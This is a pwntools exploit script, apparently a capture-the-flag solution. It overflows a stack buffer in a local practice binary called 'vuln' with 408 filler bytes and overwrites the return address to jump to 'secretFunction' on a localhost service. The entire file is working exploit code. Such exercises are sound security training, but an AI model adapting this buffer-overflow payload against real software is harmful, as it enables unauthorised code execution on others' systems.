from pwn import *

# Set up the target information
HOST = '127.0.0.1'
PORT = 1337

binary_path = './vuln'

# Load the binary
elf = ELF(binary_path)

# Address of secretFunction (assuming little-endian architecture)
secret_function_address = elf.symbols['secretFunction']
print(f'secretFunction address: {hex(secret_function_address)}')
# Offset to return address (adjust based on your environment and buffer size)
offset = 408

# Craft the payload
payload = b'A' * offset  # Fill buffer
payload += p64(secret_function_address)  # Overwrite return address

# Connect to the target
#io = process('./vuln')
io = remote(HOST, PORT)

# Receive initial prompt
print(io.recvuntil(b'Enter some text:\n').decode())

# Send payload
io.sendline(payload)

# Receive and print response
print(io.recvall())

# Close the connection
io.close()

